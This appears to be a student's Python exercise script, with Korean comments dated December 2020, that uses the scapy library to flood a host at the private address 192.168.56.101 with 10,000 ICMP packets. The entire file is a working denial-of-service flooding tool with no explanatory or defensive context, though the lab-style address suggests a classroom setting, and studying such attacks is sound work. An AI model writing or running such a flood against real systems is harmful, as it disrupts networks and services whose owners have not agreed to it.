#------------------------------------------------------------------------------------------------------------------

#                                           2020.12.24


#                                        이 태 서 학 생 ICMP_Flooding 작성
from scapy.all import *

if __name__ == '__main__':
    dstIP = "192.168.56.101"          # 목적지 IP
    count = 10000                     # 보낼 패킷 수

for x in range (0,count):             # 보낼 패킷의 범위
        send(IP(dst=dstIP)/ICMP())    # ICMP 전송
